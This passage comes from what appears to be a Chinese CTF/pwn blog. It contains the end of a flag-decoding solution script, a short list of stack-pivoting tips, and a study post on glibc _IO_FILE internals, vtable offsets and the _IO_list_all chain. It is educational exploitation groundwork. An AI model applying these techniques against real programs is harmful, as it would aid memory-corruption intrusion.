class="number">32</span>]) ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">32</span>:<span class="number">40</span>]) ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">40</span>:<span class="number">48</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><details class="folding-tag" blue><summary> 0x1不要过于依赖反汇编 </summary>              <div class='content'>              <p>很多细节其实是藏在汇编代码中的,如果过于依赖反汇编就很难发现这部分细节</p>              </div>            </details><details class="folding-tag" blue><summary> 0x2用pwntools汇编注意设置环境 </summary>              <div class='content'>              <p>pwntools,asm功能默认是在i386下,如果不设置环境的可能会出大错</p>              </div>            </details><details class="folding-tag" blue><summary> 0x3出现过的库函数皆可使用 </summary>              <div class='content'>              <p>只要函数被调用过,并布置好参数,所有的库函数都可以被使用,太久没做栈迁移,竟然忘记用可以用read部署了……….</p>              </div>            </details><details class="folding-tag" blue><summary> 0x4栈迁移的地址选择 </summary>              <div class='content'>              <p>printf和puts等函数调用时使用的栈空间较大,栈迁移后如果迁移位置不合适,很可能会造成内存越界,访问不可写的内存空间,从而产生段错误,故迁移位置一定要足够合适,一般至少要留0x800的可写空间</p>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/posts/23411/"/>
      <url>/posts/23411/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>先看IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;<span class="comment">//</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;  <span class="comment">//&lt;=0为非宽字节,&gt;0为宽字节</span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被封装于_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><details class="folding-tag" blue><summary> 其中_IO_jump_t结构体的定义为 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虚表函数的定义一般都在libio/fileops.c中</p><p>一些虚表函数定义找不到对应的函数是因为做了一些替代</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> versioned_symbol(lib,local,symbol,version) weak_alias (local, symbol)</span></span><br></pre></td></tr></table></figure>              </div>            </details><p>一个进程中的所有FILE结构体会通过<strong>_chain字段</strong>连接成为一个单链表,链表的头部是全局变量<strong>_IO_list_all</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>这个_IO_list_all也是采取的头插入法</p><p>_IO_list_all位于libc中</p><h2 id="三个特殊流"><a href="#三个特殊流" class="headerlink" title="三个特殊流"></a>三个特殊流</h2><p>在标准 I/O 库中，每个程序启动时有三个文件流是<strong>自动打开</strong>的：<strong>stdin、stdout、stderr</strong>。</p><p>但是在第一次使用前,均属于未被初始化状态(主要是_IO_read_ptr到_IO_buf_end这个8个域),其初始化时分配的缓冲区位于堆,且一般是堆最早的三个堆块.</p><p>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，需要注意的是<strong>这三个文件流位于 libc.so 的数据段</strong>。而我们使用 <strong>fopen 创建的文件流是分配在堆内存上</strong>的。</p><p>libc.so 中存在 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 关于上面这句话的理解 </summary>              <div class='content'>              <p>学习过程中经常遇到符号这个概念,这里学习一下</p><p><strong>在 C 语言中，变量的名字就是符号（symbol）</strong>。当编译器编译源代码时，会在符号表（symbol table）中为每个符号分配一个唯一的标识符，并记录它的类型、作用域和存储位置等信息。对于全局变量和静态变量，它们的符号被放置在全局符号表中，而对于局部变量，则被放置在局部符号表中。</p><p><strong>也就是说一个符号被用来代表一个变量的实例,而这个变量可以是结构体,函数或常规变量类型等等</strong></p><p>在了解了符号之后就能理解上面这句话了</p><p>_IO<em>2_1_stderr\</em>和_<em>IO_2_1_stdout\</em>和<em>_IO_2_1_stdin\</em>这三个符号对应的是三个IO_FILE<u>结构体变量的名字</u></p><p>stdin\stdout\stderr三个符号是指向三个IO_FILE结构体变量的<u>指针变量的名字</u></p>              </div>            </details><h2 id="fwrite和fread"><a href="#fwrite和fread" class="headerlink" title="fwrite和fread"></a>fwrite和fread</h2><p>fread 的实现被封装在_IO_fread,真正实现功能的是其中的_IO_sgetn,而_IO_sgetn又会调用_IO_XSGETN,而_IO_XSGETN 是vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。默认情况下_IO_file_xsgetn中存储的指针指向_IO_file_xsgetn</p><p>fwrite的实现被封装在_IO_fwrite中,在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_XSPUTN是位于vtable中的函数指针,在_IO_XSPUTN 指向的_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW,_IO_OVERFLOW 默认指向的函数是_IO_new_file_overflow</p><h2 id="fopen和fclose"><a href="#fopen和fclose" class="headerlink" title="fopen和fclose"></a>fopen和fclose</h2><p>fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose的操作是</p><ul><li>将指定的 FILE 从_chain 链表中脱链</li><li>调用系统接口 close 关闭文件</li><li>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</li></ul><h2 id="printf和puts"><a href="#printf和puts" class="headerlink" title="printf和puts"></a>printf和puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><hr><h2 id="flags标记"><a href="#flags标记" class="headerlink" title="_flags标记"></a>_flags标记</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number 可以校验文件是否有效*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000<span class="comment">//掩码，用于提取flag有效部分</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002<span class="comment">//文件流处于无缓冲模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.读文件流被禁止  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.写文件流被禁止  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010<span class="comment">//文件流已经到达文件的末尾</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020<span class="comment">//文件流上发生了错误</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.执行文件删除操作时不关闭文件流  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100<span class="comment">//文件流正在执行备份操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200<span class="comment">//文件流为行缓冲模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.关联put和get  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800<span class="comment">//文件流当前正在写入数据(往文件流中写入数据)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000<span class="comment">//文件流处于&quot;追加模式&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000<span class="comment">//标记文件流是否与标准文件缓冲区相关联</span></span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000<span class="comment">//表示用户已经为文件流提供了自定义的锁</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits for the _flags2 field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_MMAP 1  <span class="comment">//文件流支持使用内存映射进行I/O操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOTCANCEL 2<span class="comment">//表示文件流的操作不会被取消，即使在多线程或异步环境下发生了取消操作。这可以用于确保某些文件操作不会被中断或取消，以避免不一致的状态。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8<span class="comment">//文件流不使用标准C库的内部缓冲区，而是依赖于用户提供的缓冲区来进行写入操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOCLOSE 32<span class="comment">//关闭文件流时不关闭底层文件描述符，从而允许在文件描述符上进行进一步的操作。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_CLOEXEC 64<span class="comment">//文件流在执行exec系统调用时关闭文件描述符,确保在执行新程序时不会继续继承文件描述符。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NEED_LOCK 128<span class="comment">//表示文件流需要互斥锁mutex来确保多线程环境下的安全访问</span></span></span><br></pre></td></tr></table></figure><p>全缓冲没有专有的标志位,当行缓冲和无缓冲标志位皆为0时一般是全缓冲状态</p><h2 id="read和write"><a href="#read和write" class="headerlink" title="read和write"></a>read和write</h2><p>read和write这两个系统调用一般<strong>不经过用户缓冲区</strong><br>与_IO<em>FILE结构(_IO_2_1_stdin\</em>,_IO<em>2_1_stdout</em>)也没什么交集</p><p>亦不受行缓冲全缓冲这些限制</p><p>当执行read(0,dest,size)时,发送长度为len的数据</p><ol><li>若len小于等于size,read读入len长度的数据</li><li>若len大于size,则read只读入size长度的数据,并将多余的len-size长度数据留待下一次read调用</li></ol><p>当执行write(1,dest,size)时</p><p>一般情况无论如何都会写出size长度内容</p><h2 id="读缓冲区和写缓冲区的操作差异"><a href="#读缓冲区和写缓冲区的操作差异" class="headerlink" title="读缓冲区和写缓冲区的操作差异"></a>读缓冲区和写缓冲区的操作差异</h2><h3 id="读缓冲区"><a href="#读缓冲区" class="headerlink" title="读缓冲区"></a>读缓冲区</h3><ol><li><code>_IO_read_base</code>：这是指向输入缓冲区的起始位置的指针。输入缓冲区是一个内存区域，用于存储从文件中读取的数据。初始时，<code>_IO_read_base</code> 指向输入缓冲区的起始位置。</li><li><code>_IO_read_ptr</code>：这是指向下一个待读取的文件数据的位置的指针。在开始读取数据时，<code>_IO_read_ptr</code> 指向 <code>_IO_read_base</code>，然后随着数据的读取逐渐向后移动。当数据从文件流中读取时，<code>_IO_read_ptr</code> 向后移动，指向下一个可以读取的位置。</li><li><code>_IO_read_end</code>：这是指向输入缓冲区的末尾位置的指针。当 <code>_IO_read_ptr</code> 到达 <code>_IO_read_end</code> 时，表示输入缓冲区已空，没有更多数据可供读取。此时，可能会触发重新填充输入缓冲区的操作。</li></ol><h3 id="写缓冲区"><a href="#写缓冲区" class="headerlink" title="写缓冲区"></a>写缓冲区</h3><ol><li><code>_IO_write_base</code>：这是指向输出缓冲区的起始位置的指针。输出缓冲区是一个内存区域，用于存储待写入文件的数据。初始时，<code>_IO_write_base</code> 指向输出缓冲区的起始位置。</li><li><code>_IO_write_ptr</code>：这是指向下一个待写入文件的数据的位置的指针。在开始写入数据时，<code>_IO_write_ptr</code> 指向 <code>_IO_write_base</code>，然后随着数据的写入逐渐向后移动。当数据写入输出缓冲区时，<code>_IO_write_ptr</code> 向后移动，指向下一个可以写入的位置。</li><li><code>_IO_write_end</code>：这是指向输出缓冲区的末尾位置的指针。当 <code>_IO_write_ptr</code> 到达 <code>_IO_write_end</code> 时，表示输出缓冲区已满。这通常触发缓冲区的刷新操作，将缓冲区中的数据写入文件，并重新设置 <code>_IO_write_ptr</code> 到 <code>_IO_write_base</code>，以准备接受更多的数据。</li></ol><h2 id="IO-FILE一些字段解释"><a href="#IO-FILE一些字段解释" class="headerlink" title="_IO_FILE一些字段解释"></a>_IO_FILE一些字段解释</h2><h3 id="offset"><a href="#offset" class="headerlink" title="_offset"></a>_offset</h3><p><code>IO_FILE</code> 结构的 <code>_offset</code> 字段是用于文件定位的，它指示文件流的当前位置或偏移量。这个字段记录了文件流当前的读写位置，以便在读写文件时进行定位和管理。它的主要作用包括：</p><ol><li><p>文件定位：<code>_offset</code> 字段指示文件流中当前的读写位置。在读取或写入文件时，它用于确定从文件的哪个位置开始读取或写入数据。</p></li><li><p>文件指针的移动：<code>fseek</code> 和 <code>fsetpos</code> 等函数可用于显式地更改文件流的 <code>_offset</code> 字段，以将文件指针移动到指定的位置。</p></li><li><p>文件读写的相对位置： <code>_offset</code> 字段允许程序知道文件流在读取或写入时相对于文件开头的位置，这对于文件的随机访问非常有用。</p></li><li><p>文件尾标记： <code>_offset</code> 字段还用于跟踪文件流是否已经达到文件的末尾。当 <code>_offset</code> 达到文件的末尾时，进一步的读取操作将返回文件结束标记（EOF）。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* _IO_pos_BAD is an off64_t value indicating error, unknown, or EOF.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_BAD ((off64_t) -1)<span class="comment">//文件末尾</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* _IO_pos_adjust adjusts an off64_t by some number of bytes.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_adjust(pos, delta) ((pos) += (delta))<span class="comment">//文件中间某位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* _IO_pos_0 is an off64_t value indicating beginning of file.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_pos_0 ((off64_t) 0)<span class="comment">//文件起始</span></span></span><br></pre></td></tr></table></figure><p>这个字段十分重要,</p><p><strong>每一次文件流读写操作的基址都由其决定</strong>,fread,fwrite等函数操作完成后都会将_offse后移</p><p>为了准确的定位_offset</p><p><strong>读写时会有各种操作平衡读写一致</strong></p><h3 id="cur-column"><a href="#cur-column" class="headerlink" title="_cur_column"></a>_cur_column</h3><p><code>_cur_column</code> 是 <code>IO_FILE</code> 结构中的字段，用于跟踪文件流的当前列位置（column position）。这个字段通常用于文本文件的处理，以记录最后一个字符写入或读取的列位置。具体作用如下：</p><ol><li><p>列位置跟踪：<code>_cur_column</code> 字段记录文件流中当前字符的列位置。在文本文件中，这可以表示当前字符在行中的偏移量，以便进行格式化或对齐文本。</p></li><li><p>文本格式化：在文本文件的读写过程中，<code>_cur_column</code> 字段可以用于确保文本数据按列或字段正确对齐。例如，它可用于在写入文本数据时进行缩进或对齐，以确保文本格式的一致性。</p></li><li><p>读取和写入的参考点：<code>_cur_column</code> 字段可以作为读取或写入的参考点，以确定下一个字符的列位置。这对于编写自定义文本处理代码非常有用，例如，在解析CSV文件或生成格式化的文本输出时。</p></li></ol><h3 